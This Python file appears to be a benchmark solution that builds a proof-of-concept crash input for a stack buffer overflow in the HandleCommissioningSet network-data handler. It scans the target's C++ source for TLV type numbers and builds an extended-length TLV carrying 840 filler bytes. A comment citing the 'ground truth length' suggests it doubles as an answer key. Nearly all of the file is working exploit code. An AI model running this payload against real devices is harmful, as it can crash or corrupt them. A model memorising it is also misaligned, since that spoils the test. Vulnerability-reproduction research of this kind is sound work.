import os
import tarfile
import struct
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Stack Buffer Overflow in HandleCommissioningSet in network-data.
        It occurs when a Commissioner Dataset TLV with extended length is processed and copied
        into a fixed-size stack buffer without proper validation.
        
        We dynamically analyze the source code to identify the specific TLV Type ID triggering the issue,
        defaulting to kBorderAgentLocator (Type 9) if analysis fails.
        """
        
        # Defaults
        # kBorderAgentLocator (9) and kCommissionerSessionId (11) are common vulnerable vectors in this function
        DEFAULT_TYPE = 9 
        # Ground truth length is 844. 4 bytes header + 840 bytes payload matches this.
        PAYLOAD_SIZE = 840 
        
        tlv_map = {}
        target_types = []

        def process_content(content):
            # Extract enum values: kSomeName = 123
            for name, val in re.findall(r'k(\w+)\s*=\s*(\d+)', content):
                tlv_map[name] = int(val)
            
            # Locate HandleCommissioningSet function and identify TLVs used with GetValue()
            if 'HandleCommissioningSet' in content:
                # Find approx location of function
                idx = content.find('HandleCommissioningSet')
                # Analyze a chunk of code (heuristic)
                chunk = content[idx:idx+8000]
                
                # Split by 'case' to find switch cases handling TLVs
                cases = chunk.split('case ')
                for c in cases[1:]:
                    # Look for cases that call GetValue (implying a copy operation)
                    if 'GetValue' in c:
                        # Extract the TLV name, e.g. Tlv::kBorderAgentLocator:
                        m = re.search(r'k(\w+)[:\s]', c)
                        if m:
                            target_types.append(m.group(1))

        # 1. Analyze Source Code
        try:
            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, 'r') as tar:
                    for member in tar.getmembers():
                        if member.isfile() and (member.name.endswith('.cpp') or member.name.endswith('.hpp')):
                            try:
                                f = tar.extractfile(member)
                                if f:
                                    process_content(f.read().decode('utf-8', errors='ignore'))
                            except Exception:
                                pass
            elif os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for file in files:
                        if file.endswith('.cpp') or file.endswith('.hpp'):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    process_content(f.read())
                            except Exception:
                                pass
        except Exception:
            pass

        # 2. Select Vulnerable TLV Type
        selected_type = DEFAULT_TYPE
        if target_types:
            for tname in target_types:
                if tname in tlv_map:
                    selected_type = tlv_map[tname]
                    # Prefer known vulnerable fixed-size types if multiple found
                    if 'BorderAgentLocator' in tname or 'SessionId' in tname:
                        break
        
        # 3. Construct Payload
        # Format: [Type: 1 byte] [Length: 1 byte] [Extended Length: 2 bytes] [Value: N bytes]
        # Length = 0xFF indicates Extended Length field follows.
        # Extended Length is Big Endian uint16.
        
        header = struct.pack('>BBH', selected_type, 0xFF, PAYLOAD_SIZE)
        payload = b'A' * PAYLOAD_SIZE
        
        return header + payload